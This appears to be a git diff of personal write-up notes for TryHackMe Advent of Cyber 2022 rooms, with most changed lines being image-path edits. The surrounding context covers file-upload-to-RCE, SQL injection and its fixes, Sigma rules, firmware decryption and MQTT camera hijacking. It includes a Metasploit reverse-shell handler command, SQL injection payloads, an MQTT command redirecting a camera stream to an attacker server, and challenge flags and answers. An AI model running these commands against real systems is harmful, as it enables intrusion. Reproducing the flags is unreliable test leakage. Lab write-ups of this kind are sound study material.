 - We change the 105 into a 100 and get the flag:
 
-![](../../../Attachments/Pasted%20image%2020221216232556.png)
+![](../../../Pasted%20image%2020221216232556.png)
 
 
 A: THM{CLOSE_THE_DOOR}
@@ -1931,11 +1931,11 @@ A: THM{CLOSE_THE_DOOR}
 
 - The given website allows file uploads:
 
-![](../../../Attachments/Pasted%20image%2020221217145554.png)
+![](../../../Pasted%20image%2020221217145554.png)
 
 - We can also upload `.exe` files:
 
-![](../../../Attachments/Pasted%20image%2020221217145726.png)
+![](../../../Pasted%20image%2020221217145726.png)
 
 ### Why the fuss over the Web Root?
 
@@ -1994,7 +1994,7 @@ A: THM{CLOSE_THE_DOOR}
 - C# is a popular language used to create both Windows application and web applications at large organisations. 
 - Let's look at our base file upload function first:
 
-![](../../../Attachments/Pasted%20image%2020221217151127.png)
+![](../../../Pasted%20image%2020221217151127.png)
 
 - As we can see, the developer made sure to store the CV outside the web root by setting the full path to a different drive (D:\CVUploads). However, this is not sufficient. Let's take a look at what additional controls can be implemented:
 
@@ -2003,7 +2003,7 @@ A: THM{CLOSE_THE_DOOR}
 - We can validate the content of the file by reviewing the ContentType header that is sent by the browser when a file is uploaded:
 
 
-![](../../../Attachments/Pasted%20image%2020221217151426.png)
+![](../../../Pasted%20image%2020221217151426.png)
 
 - If the file content type is not PDF, we will reject the file. 
 - While this is a good control, it should be noted that since the browser sets this header, an attacker could bypass this control by intercepting the request and changing the header.
@@ -2152,11 +2152,11 @@ What is the value of the flag stored in the HR Elf's Documents directory?
 - Then used the following command to get a meterpreter shell `sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.245.54; set LPORT 1337;exploit"
 `:
 
-![](../../../Attachments/Pasted%20image%2020221217154749.png)
+![](../../../Pasted%20image%2020221217154749.png)
 
 - We navigate to `C:\Users\HR_Elf\Documents` and print the flag
 
-![](../../../Attachments/Pasted%20image%2020221217155125.png)
+![](../../../Pasted%20image%2020221217155125.png)
   
   A: THM{Naughty.File.Uploads.Can.Get.You.RCE}
 
@@ -2221,7 +2221,7 @@ $elves_rs=mysqli_query($db,$query);
 - Depending on the number you put on the `id` parameter of the URL, you get served the profile of a different elf. 
 	- Behind the curtains, this works by creating an SQL query that embeds the `id` parameter value and returns the information on the corresponding elf.
 
-![](../../../Attachments/Pasted%20image%2020221217233608.png)
+![](../../../Pasted%20image%2020221217233608.png)
 
 - In code, it would look like this:
 
@@ -2266,7 +2266,7 @@ select * from users where id=-1 OR id = 4
 
 Suddenly, the attacker has injected some SQL syntax that, when concatenated to our original query, ends up serving the data of the elf with `id=4` for some weird reason.
 
-![](../../../Attachments/Pasted%20image%2020221217233952.png)
+![](../../../Pasted%20image%2020221217233952.png)
 
 - While this example shows a harmless injection, a skilled attacker can try to get your server to run much more complex SQL queries and potentially force the database to return any data on any table they want. 
 - Just as an example, look at what happens when you put the following in the `id` parameter:
@@ -2323,7 +2323,7 @@ $toys_rs=mysqli_query($db,$query);
 - The problem with having PHP build the query is that the database has no other option but to trust what it is being given. 
 - If an attacker somehow injects SQL, PHP will blindly concatenate the injected payload into the query string, and the database will execute it.
 
-![](../../../Attachments/Pasted%20image%2020221217235325.png)
+![](../../../Pasted%20image%2020221217235325.png)
 
 - While there are a couple of ways to go about this, the safest bet is to use prepared statements to prevent SQL injections.  
 
@@ -2331,7 +2331,7 @@ $toys_rs=mysqli_query($db,$query);
 - Instead of building a single string by concatenation, you will first describe the structure of your SQL query and use placeholders to indicate the position of your query's parameters. 
 	- You will then bind the parameters to the prepared statement in a separate function call.
 
-![](../../../Attachments/Pasted%20image%2020221217235431.png)
+![](../../../Pasted%20image%2020221217235431.png)
 - Instead of providing a single SQL query string, we will send any dynamic parameters separately from the query itself, allowing the database to stick the pieces together securely without depending on PHP or the programmer. 
 - Let's see how this looks in the code.
 
@@ -2394,13 +2394,13 @@ What is the value of Flag1?
 
 - Sanitized the input for id in two places:
 
-![](../../../Attachments/Pasted%20image%2020221217234922.png)
+![](../../../Pasted%20image%2020221217234922.png)
 
  A: THM{McCode, Elf McCode}
 
 What is the value of Flag2?  
 
-![](../../../Attachments/Pasted%20image%2020221218000021.png)
+![](../../../Pasted%20image%2020221218000021.png)
 
  A: THM{KodeNRoll}
 
@@ -2416,7 +2416,7 @@ What is the value of Flag4?
 
 - Just added these lines in `login.php`:
 
-![](../../../Attachments/Pasted%20image%2020221218001252.png)
+![](../../../Pasted%20image%2020221218001252.png)
 
 ```php
 $query="select * from users where username= ? and password= ?";
@@ -2489,7 +2489,7 @@ A: THM{SQLi_who???}
 
 Here's a table to summarize everything above:
 
-![](../../../Attachments/Pasted%20image%2020221218102605.png)
+![](../../../Pasted%20image%2020221218102605.png)
 
 ### The Unique Case of Free-Form Text
 
@@ -2613,7 +2613,7 @@ Filtering for Usernames: How many usernames fit the syntax above?
 
 - Used: `egrep '^[a-zA-Z0-9]{6,12}$' strings`
 
-![](../../../Attachments/Pasted%20image%2020221218104721.png)
+![](../../../Pasted%20image%2020221218104721.png)
 
  A: 8
 
@@ -2626,7 +2626,7 @@ Filtering for Emails: How many emails fit the syntax above?
 
 - Used  `egrep '^.+@.+\.com$' strings`
 
-![](../../../Attachments/Pasted%20image%2020221218105211.png)
+![](../../../Pasted%20image%2020221218105211.png)
 
  A: 11
 
@@ -2634,7 +2634,7 @@ Filtering for Emails: How many unique domains are there?
 
 - Used `egrep '^.+@.+\.com$' strings | cut -d '@' -f 2 |  sort | uniq | wc -l`
 
-![](../../../Attachments/Pasted%20image%2020221218110309.png)
+![](../../../Pasted%20image%2020221218110309.png)
 
  A: 8
 
@@ -2642,7 +2642,7 @@ Filtering for Emails: What is the domain of the email with the local-part "lewi
 
 - Used regex again on the resulted list of emails and then used cut to get the domain: `egrep '^.+@.+\.com$' strings | egrep '^lewisham44' | cut -d '@' -f 2`
 
-![](../../../Attachments/Pasted%20image%2020221218110442.png)
+![](../../../Pasted%20image%2020221218110442.png)
 
  A: amg.com
 
@@ -2650,7 +2650,7 @@ Filtering for Emails: What is the domain of the email with the local-part "maxx
 
 - Used regex again on the resulted list of emails and then used cut to get the domain: `egrep '^.+@.+\.com$' strings | egrep '^maxximax' | cut -d '@' -f 2`
 
-![](../../../Attachments/Pasted%20image%2020221218110659.png)
+![](../../../Pasted%20image%2020221218110659.png)
 
  A: fedfull.com
 
@@ -2658,7 +2658,7 @@ Filtering for Emails: What is the local-part of the email with the domain name 
 
 - Followed the same pattern except now we are matching the end of the resulted email and we want to get the local-part of the email matched, thus we change the number of the field used in cut.
 
-![](../../../Attachments/Pasted%20image%2020221218110728.png)
+![](../../../Pasted%20image%2020221218110728.png)
 
  A: hussain.volt
 
@@ -2666,7 +2666,7 @@ Filtering for URLs: How many URLs fit the syntax provided?
 
 - Used regex: `egrep '^http(s)?.+(www)?.+\..+$' strings `
 
-![](../../../Attachments/Pasted%20image%2020221218111257.png)
+![](../../../Pasted%20image%2020221218111257.png)
 
 - We know that all URL's start with http. 
 	- Thus, we can mark `s` as an optional character here
@@ -2681,7 +2681,7 @@ Filtering for URLs: How many of these URLs start with "https"?
 
 - Used the following bash command: `egrep '^http(s)?.+(www)?.+\..+$' strings | egrep '^https'`
 
-![](../../../Attachments/Pasted%20image%2020221218111633.png)
+![](../../../Pasted%20image%2020221218111633.png)
 
 A: 7
 
@@ -2712,7 +2712,7 @@ A: 7
 - The attack chain report included indicators of compromise (IOCs) and necessary detection parameters, as listed below. 
 - Additionally, the attack techniques have been linked to the MITRE ATT&CK framework for further reading.
 
-![](../../../Attachments/Pasted%20image%2020221219073508.png)
+![](../../../Pasted%20image%2020221219073508.png)
 
 - Sigma application constitutes of the following features:
 
@@ -2749,7 +2749,7 @@ A: 7
 - Sigma rules are guided by a given order of required/optional fields and values that create the structure for mapping needed queries. 
 - The attached image provides a skeletal view of a Sigma rule.
 
-![](../../../Attachments/Pasted%20image%2020221219073928.png)
+![](../../../Pasted%20image%2020221219073928.png)
 
 - Let’s use the first attack step challenge to define the syntax requirements, fill in the details into our skeletal rule, and detect the creation of local accounts. 
 - Use the text editor section of the SigHunt application to follow along.
@@ -2775,7 +2775,7 @@ A: 7
 - The main type of modifiers are known as **Transformation modifiers** and comprise the values: _contains_, _endswith_, _startswith_, and _all_. 
 	- Some of these modifiers will be vital in writing rules against the other IOCs.
 
-![](../../../Attachments/Pasted%20image%2020221219074805.png)
+![](../../../Pasted%20image%2020221219074805.png)
 
 -   **FalsePositives:** A list of known false positives that may occur based on log data.
     
@@ -2794,13 +2794,13 @@ A: 7
   
 What is the Challenge #1 flag?
 
-![](../../../Attachments/Pasted%20image%2020221219074921.png)
+![](../../../Pasted%20image%2020221219074921.png)
 
  A: THM{n0t_just_your_u$ser}
 
 From the Challenge 1 log, what user account was created?  
 
-![](../../../Attachments/Pasted%20image%2020221219075015.png)
+![](../../../Pasted%20image%2020221219075015.png)
 
  A: 	BanditYetiMini
 
@@ -2843,26 +2843,26 @@ tags: # Associated TTPs from MITRE ATT&CK
   - {attack.technique} # MITRE Technique 
 ```
 
-![](../../../Attachments/Pasted%20image%2020221219080436.png)
+![](../../../Pasted%20image%2020221219080436.png)
 
  A: THM{wh@t_1s_Runn1ng_H3r3}
 
 What was the User's path in the Challenge #2 log file?  
 
-![](../../../Attachments/Pasted%20image%2020221219080631.png)
+![](../../../Pasted%20image%2020221219080631.png)
 
  A:  	SIGMA_AOC2022\Bandit Yeti
  
 
 What is the Challenge #3 flag?  
 
-![](../../../Attachments/Pasted%20image%2020221219081034.png)
+![](../../../Pasted%20image%2020221219081034.png)
 
  A:  THM{sch3dule_0npo1nt_101}
 
 What was the MD5 hash associated with Challenge #3 logs?
 
-![](../../../Attachments/Pasted%20image%2020221219081154.png)
+![](../../../Pasted%20image%2020221219081154.png)
 
 A: 2F6CE97FAF2D5EEA919E4393BDD416A7
 
@@ -2899,7 +2899,7 @@ A: 2F6CE97FAF2D5EEA919E4393BDD416A7
 - We have just performed digital hardware communication! 
 - These are the wonderful squiggly lines you would see on a logic analyser:
 
-![](../../../Attachments/Pasted%20image%2020221220091805.png)
+![](../../../Pasted%20image%2020221220091805.png)
 
 - We can transmit text data by using the [ASCII table](https://www.asciitable.com/). 
 - Sending the binary representation of each character, we can transmit data! 
@@ -2930,7 +2930,7 @@ A: 2F6CE97FAF2D5EEA919E4393BDD416A7
 - Once the two devices agree on the configuration of the serial lines, they can now communicate with each other. 
 - A single transmission is shown in the diagram below on how the ASCII character of "S" would be transmitted:
 
-![](../../../Attachments/Pasted%20image%2020221220092251.png)
+![](../../../Pasted%20image%2020221220092251.png)
 
 - There are a couple of caveats, however. 
 - The devices don't really have a way to determine if the other device is ready for communication. 
@@ -2948,7 +2948,7 @@ A: 2F6CE97FAF2D5EEA919E4393BDD416A7
 	- So the trade-off is adding an additional wire, but we gain a speed and reliability boost. 
 - An example of the same "S" being transmitted using SPI is shown below:
 
-![](../../../Attachments/Pasted%20image%2020221220092514.png)
+![](../../../Pasted%20image%2020221220092514.png)
 
 - The clock line tells the receiving device exactly when it needs to read the data line. 
 - Two-way communication is also possible, but quite a bit more complex than serial communication. 
@@ -2958,7 +2958,7 @@ A: 2F6CE97FAF2D5EEA919E4393BDD416A7
 - If two-way communication is used, instead of having a single data line, two lines are used, namely Peripheral-In Controller-Out (PICO), which means communication is sent from the controller, and Peripheral-Out Controller-In (POCI), which means communication is sent from the secondary device back to the controller. 
 - Using this, the controller sends a clock signal and a command out to the device using the PICO line and then keeping the clock signal, the controller receives data back on the PICO line, as shown in the diagram below:
 
-![](../../../Attachments/Pasted%20image%2020221220092645.png)
+![](../../../Pasted%20image%2020221220092645.png)
 
 - There is one additional change that can be made. 
 - While there can only be one controller, there can be multiple secondary devices. 
@@ -2966,7 +2966,7 @@ A: 2F6CE97FAF2D5EEA919E4393BDD416A7
 	- A fourth wire, called the Chip Select (CS) wire, is used to distinguish the device that the communication is meant for. 
 - The controller can use this line to indicate to the specific device that it wants to communicate to it, as shown in the diagram below:
 
-![](../../../Attachments/Pasted%20image%2020221220092732.png)
+![](../../../Pasted%20image%2020221220092732.png)
 
 - SPI communication is a fair bit more complex than USART, but having a dedicated clock line increases the speed at which we can communicate and improves reliability.
 
@@ -2988,7 +2988,7 @@ A: 2F6CE97FAF2D5EEA919E4393BDD416A7
 - Each device can monitor these Start and Stop signals to determine if the lines are busy with communication. 
 - An example of such a data transmission is shown below:
 
-![](../../../Attachments/Pasted%20image%2020221220092940.png)
+![](../../../Pasted%20image%2020221220092940.png)
 
 - Since an external clock line is used, communication is still faster and more reliable than USART, and while it is slightly slower than SPI, the use of the Address signal means up to 1008 devices can be connected to the same two lines and will be able to communicate. 
 - Now that we understand the basics of hardware communication protocols, we can look to analyse the logic of that rogue implant!
@@ -2997,7 +2997,7 @@ A: 2F6CE97FAF2D5EEA919E4393BDD416A7
 
 - After sending this rogue implant to the forensic lab for analysis, the following circuit diagram is uncovered:
 
-![](../../../Attachments/Pasted%20image%2020221220093109.png)
+![](../../../Pasted%20image%2020221220093109.png)
 
 - Based on the diagram, it seems like there is a microprocessor that is connected to an ESP32 chip. 
 	- Doing some research, we can see that the ESP32 chips allow microprocessors to communicate over WiFi and Mobile networks. 
@@ -3018,15 +3018,15 @@ A: 2F6CE97FAF2D5EEA919E4393BDD416A7
 
 - In order to analyse the logic data dump, we will need to use a logic analyser tool called [Saleae](https://www.saleae.com/).
 
-![](../../../Attachments/Pasted%20image%2020221220093436.png)
+![](../../../Pasted%20image%2020221220093436.png)
 
-![](../../../Attachments/Pasted%20image%2020221220093544.png)
+![](../../../Pasted%20image%2020221220093544.png)
 
 - D0 and D1 refer to the digital channels of the two lines that were probed. 
 - A0 and A1 refer to the analogue data from the probers.
 - Hover your mouse over the first thick line on D1 channel 1 and use Left-Ctrl and the mouse wheel to zoom in again; you should be able to see the entire signal transfer:
 
-![](../../../Attachments/Pasted%20image%2020221220093641.png)
+![](../../../Pasted%20image%2020221220093641.png)
 
 - What is very interesting from this screen is that you can see how the analogue voltage data corresponds to the digital signal that is seen. 
 - Looking at the A1 Channel 1 vs D1 Channel 1, you can see that there are slight breaks in the analogue data that have been corrected in the digital channel. 
@@ -3041,7 +3041,7 @@ A: 2F6CE97FAF2D5EEA919E4393BDD416A7
 - Once saved, we can see that the data is being analysed. 
 - Click the little terminal Icon, and we can actually read the data being transmitted!
 
-![](../../../Attachments/Pasted%20image%2020221220094335.png)
+![](../../../Pasted%20image%2020221220094335.png)
 
 - We see the initialisation sequence of the serial line and then three lines of data being sent:
 	-   ACK REBOOT
@@ -3052,7 +3052,7 @@ A: 2F6CE97FAF2D5EEA919E4393BDD416A7
 - In order to see the other messages, we need to add another analyser to Channel 0.
 - Click the plus icon next to Analysers and add another Async Serial analyser with the same configuration, except for Channel 0:
 
-![](../../../Attachments/Pasted%20image%2020221220094601.png)
+![](../../../Pasted%20image%2020221220094601.png)
 
 - Now we are starting to piece together the information! 
 - It seems like the microprocessor is establishing a session with the ESP32 device to allow communication to the control server! 
@@ -3110,7 +3110,7 @@ What is the flag that is transmitted once the new baud rate was accepted?
 
 - Change the baud rate to 9600 of the second async serial we created
 
-![](../../../Attachments/Pasted%20image%2020221220095155.png)
+![](../../../Pasted%20image%2020221220095155.png)
 
 A: THM{Hacking.Hardware.Is.Fun}
 
@@ -3188,7 +3188,7 @@ bin  firmware-mod-kit  bin-unsigned
 - First, change the directory to the `bin` folder by entering the command `cd bin`. 
 - She will then use the `binwalk` tool to verify the encryption using the command `binwalk -E -N firmwarev2.2-encrypted.gpg.`
 
-![](../../../Attachments/Pasted%20image%2020221223104937.png)
+![](../../../Pasted%20image%2020221223104937.png)
 
 - In the above output, the **rising entropy edge** means that the file is probably encrypted and has increased randomness.
 
@@ -3202,7 +3202,7 @@ bin  firmware-mod-kit  bin-unsigned
 - To extract the firmware, change the directory by entering the command `cd ..` and then `cd bin-unsigned`. 
 - She extracted the firmware by issuing the following command: `extract-firmware.sh firmwarev1.0-unsigned`
 
-![](../../../Attachments/Pasted%20image%2020221223105300.png)
+![](../../../Pasted%20image%2020221223105300.png)
 
 ### Step 3: Finding Encryption Keys  
 
@@ -3210,44 +3210,44 @@ bin  firmware-mod-kit  bin-unsigned
 - We know that the unencrypted firmware is extracted successfully and stored in the `fmk` folder. 
 - The easiest way to find keys is by using the `grep` command. The `-i` flag in the grep command ignores case sensitivity while the `-r` operator recursively searches in the current directory and subdirectories: `grep -ir key`
 
-![](../../../Attachments/Pasted%20image%2020221223105532.png)
+![](../../../Pasted%20image%2020221223105532.png)
 
 - Bingo! We have the **public and private keys**, but what about the **paraphrase** usually used with the private key to decrypt a gpg encrypted file?  
 
 - Let's find the paraphrase through the same `grep` command: `grep -ir paraphrase`
 
-![](../../../Attachments/Pasted%20image%2020221223105643.png)
+![](../../../Pasted%20image%2020221223105643.png)
 
 ### Step 4: Decrypting the Encrypted Firmware  
 
 - Now that we have the keys, let's import them using the following command: `gpg --import fmk/rootfs/gpg/private.key`
 
-![](../../../Attachments/Pasted%20image%2020221223120341.png)
+![](../../../Pasted%20image%2020221223120341.png)
 
-![](../../../Attachments/Pasted%20image%2020221223120408.png)
+![](../../../Pasted%20image%2020221223120408.png)
 
 - Importing the public key: `gpg --import fmk/rootfs/gpg/public.key`
 
-![](../../../Attachments/Pasted%20image%2020221223120520.png)
+![](../../../Pasted%20image%2020221223120520.png)
 
 - We can list the secret keys: `gpg --list-secret-keys`
 
-![](../../../Attachments/Pasted%20image%2020221223120639.png)
+![](../../../Pasted%20image%2020221223120639.png)
 
 - Once the keys are imported, McSkidy decrypts the firmware using the `gpg` command. 
 - Again change the directory by entering the command `cd ..` and then `cd bin`.
 `gpg firmwarev2.2-encrypted.gpg`
 
-![](../../../Attachments/Pasted%20image%2020221223120743.png)
+![](../../../Pasted%20image%2020221223120743.png)
 
-![](../../../Attachments/Pasted%20image%2020221223120840.png)
+![](../../../Pasted%20image%2020221223120840.png)
 
 ### **Step 5: Reversing the** **Original** **Encrypted Firmware**  
 
 - This is the simplest step, and we can use `binwalk` or `FMK` to extract code from the recently unencrypted firmware. In this example, we will be using `FMK` to extract the code.
 `extract-firmware.sh firmwarev2.2-encrypted`
 
-![](../../../Attachments/Pasted%20image%2020221223120945.png)
+![](../../../Pasted%20image%2020221223120945.png)
 
 - McSkidy has finally been able to reverse the complete firmware and extract essential files she will use for IoT exploitation (next room). 
 - She has used the keys from an older version (1.0)  to decrypt the latest version (2.2) of the same firmware. 
@@ -3260,7 +3260,7 @@ What is the flag value after reversing the file firmwarev2.2-encrypted.gpg?
 
 **Note**: The flag contains underscores - if you're seeing spaces, the underscores might not be rendering.
 
-![](../../../Attachments/Pasted%20image%2020221223121111.png)
+![](../../../Pasted%20image%2020221223121111.png)
 
  A: THM{WE_GOT_THE_FIRMWARE_CODE}
  
@@ -3273,7 +3273,7 @@ After reversing the encrypted firmware, can you find the build number for rootf
 - cd into **rootfs** and issue the command `ls -alh`. 
 - Look around for a red line:
 
-![](../../../Attachments/Pasted%20image%2020221223121420.png)
+![](../../../Pasted%20image%2020221223121420.png)
 
 A: 2.6.31
 
@@ -3337,13 +3337,13 @@ A: 2.6.31
 - Devices commonly use middleware because they must be lightweight and efficient; for example, an IoT device may not support a more robust protocol, such as HTTP. 
 	- A server is placed in the middle of two clients who want to communicate to translate the communication method to a means both devices can understand, given their technology.
 
-![](../../../Attachments/Pasted%20image%2020221223151914.png)
+![](../../../Pasted%20image%2020221223151914.png)
 
 - Recall how we mentioned that the combability of device protocols could be a problem; middleware fixes some of the associated issues but may still be unable to translate all communications.
 
 - Below is a brief synopsis of popular messaging protocols used by IoT devices.
 
-![](../../../Attachments/Pasted%20image%2020221223151954.png)
+![](../../../Pasted%20image%2020221223151954.png)
 
 - We will continue diving deeper into the MQTT protocol and potentially related security issues throughout this task.
 
@@ -3353,7 +3353,7 @@ A: 2.6.31
 - The model relies on a broker to negotiate **"published" messages** and **"subscription" queries**. 
 - Let's first look at a diagram of this process and then break it down further.
 
-![](../../../Attachments/Pasted%20image%2020221223152139.png)
+![](../../../Pasted%20image%2020221223152139.png)
 
 - Based on the above diagram,
 
@@ -3373,11 +3373,11 @@ A: 2.6.31
 
 - Below is a diagram showing two publishers sending different messages associated with topics.
 
-![](../../../Attachments/Pasted%20image%2020221223152340.png)
+![](../../../Pasted%20image%2020221223152340.png)
 
 - Below is a diagram of several subscribers receiving messages from separate topics of a broker.
 
-![](../../../Attachments/Pasted%20image%2020221223152412.png)
+![](../../../Pasted%20image%2020221223152412.png)
 
 - Note the _asynchronous_ nature of this communication; the publisher can publish at any time, and the subscriber can subscribe to a topic to see if the broker relaid messages. 
 - Typically, subscribers and publishers will continue attempting to connect to the broker for a specific duration.
@@ -3550,9 +3550,9 @@ What port is Mosquitto running on? 
 - Ran `nmap -p- <IP> -vv --min-rate 1500`
 - Apart from port 22 and 80, there is another one:
 
-![](../../../Attachments/Pasted%20image%2020221223155758.png)
+![](../../../Pasted%20image%2020221223155758.png)
 
-![](../../../Attachments/Pasted%20image%2020221223155851.png)
+![](../../../Pasted%20image%2020221223155851.png)
 
  A: 1883
  
@@ -3560,7 +3560,7 @@ Is the _device/init_ topic enumerated by Nmap during a script scan of all port
 
 `nmap -sC -sV -p- 10.10.230.161 -vv --min-rate 1500`
 
-![](../../../Attachments/Pasted%20image%2020221223160516.png)
+![](../../../Pasted%20image%2020221223160516.png)
 
 A: y
 
@@ -3574,7 +3574,7 @@ What flag is obtained from viewing the RTSP stream?
 
 - Subscribed to `device/ping`: ` mosquitto_sub -h 10.10.230.161 -t device/init
 - Got the device ID:
-- ![](../../../Attachments/Pasted%20image%2020221223161420.png)
+- ![](../../../Pasted%20image%2020221223161420.png)
 - Initiated an RTSP server: `-   `docker run --rm -it --network=host aler9/rtsp-simple-server``
 - Published the payload: `mosquitto_pub -h 10.10.230.161 -t device/3OZROCITAW46B9BI0ZHV/cmd -m """{"cmd":"10","url":"rtsp://10.10.231.110:8554/anything"}"""
 `
@@ -3582,7 +3582,7 @@ What flag is obtained from viewing the RTSP stream?
 
 - View the stream:  -   `vlc rtsp://127.0.0.1:8554/anything`
 
-![](../../../Attachments/Pasted%20image%2020221223163902.png)
+![](../../../Pasted%20image%2020221223163902.png)
 
 A: THM{UR_CAMERA_IS_MINE}
 
@@ -3618,7 +3618,7 @@ A: THM{UR_CAMERA_IS_MINE}
 - In the picture, the front of the defending army is covered by their shields, whereas the walls of a pass cover the sides, leaving no room for an attacker to inflict damage on the defenders without running into their defenses. 
 - This is how the Spartan army could hold back a much larger Persian army for several days in the battle of Thermopylae.
 
-![](../../../Attachments/Pasted%20image%2020221223171015.png)
+![](../../../Pasted%20image%2020221223171015.png)
 
 - However, this attack surface reduction works for the weapons of that time. 
 - This technique will not impact the attack surface against modern weapons. 
@@ -3673,9 +3673,9 @@ A: THM{UR_CAMERA_IS_MINE}
 
 Follow the instructions in the attached static site to help McSkidy reduce her attack surface against attacks from the Yeti. Use the flag as an answer to complete the task.
 
-![](../../../Attachments/Pasted%20image%2020221223171630.png)
+![](../../../Pasted%20image%2020221223171630.png)
 
-![](../../../Attachments/Pasted%20image%2020221223171730.png)
+![](../../../Pasted%20image%2020221223171730.png)
 
 A: THM{4TT4CK SURF4C3 R3DUC3D}
 
@@ -3761,21 +3761,21 @@ A: THM{4TT4CK SURF4C3 R3DUC3D}
 
 ### Questions
 
-![](../../../Attachments/Pasted%20image%2020221224114556.png)
+![](../../../Pasted%20image%2020221224114556.png)
 
-![](../../../Attachments/Pasted%20image%2020221224114708.png)
+![](../../../Pasted%20image%2020221224114708.png)
 Case 1: What is the password for Santa’s Vault?
 
  A: S3cr3tV@ultPW
 
 Case 1: What is the Flag?  
 
-![](../../../Attachments/Pasted%20image%2020221224114757.png)
+![](../../../Pasted%20image%2020221224114757.png)
 
  A:THM{EZ_fl@6!}
 
 Case 2: What is Santa’s favourite thing?  
-![](../../../Attachments/Pasted%20image%2020221224114926.png)
+![](../../../Pasted%20image%2020221224114926.png)
  A: MilkAndCookies
 
 Case 2: What is the password for Santa’s Vault?  
@@ -3786,13 +3786,13 @@ Opened the laptop with the password being Santa's favourite thing we got previou
 
 Case 2: What is the Flag?  
 
-![](../../../Attachments/Pasted%20image%2020221224115029.png)
+![](../../../Pasted%20image%2020221224115029.png)
 
  A: THM{m0@r_5t3pS_n0w!}
 
 Case 3: What is the Executive Assistant’s favourite thing?  
 
-![](../../../Attachments/Pasted%20image%2020221224115320.png)
+![](../../../Pasted%20image%2020221224115320.png)
 
  A: BanoffeePie
  
@@ -3806,7 +3806,7 @@ Case 3: What is the Executive Assistant’s favourite thing?
 
 Case 3: What is Santa’s previous password?  
 
-![](../../../Attachments/Pasted%20image%2020221224115849.png)
+![](../../../Pasted%20image%2020221224115849.png)
 
  A:  H0tCh0coL@t3_01
 
@@ -3814,19 +3814,19 @@ Case 3: What is Santa’s current password?
 
 - Just change the last digit of his old password
 
-![](../../../Attachments/Pasted%20image%2020221224120332.png)
+![](../../../Pasted%20image%2020221224120332.png)
 
 A: H0tCh0coL@t3_02
 
 Case 3: What is the 1st part of the vault’s password?  
 
-![](../../../Attachments/Pasted%20image%2020221224120343.png)
+![](../../../Pasted%20image%2020221224120343.png)
 
 A: N3w4nd1m
 
 Case 3: What is the 2nd part of the vault’s password?  
 
-![](../../../Attachments/Pasted%20image%2020221224115828.png)
+![](../../../Pasted%20image%2020221224115828.png)
 
  A: Pr0v3dV@ultPW
 
@@ -3836,7 +3836,7 @@ Case 3: What is the password for Santa’s Vault?
 
 Case 3: What is the Flag?  
 
-![](../../../Attachments/Pasted%20image%2020221224120414.png)
+![](../../../Pasted%20image%2020221224120414.png)
 
  A:  THM{B@d_Y3t1_1s_n@u6hty}
  
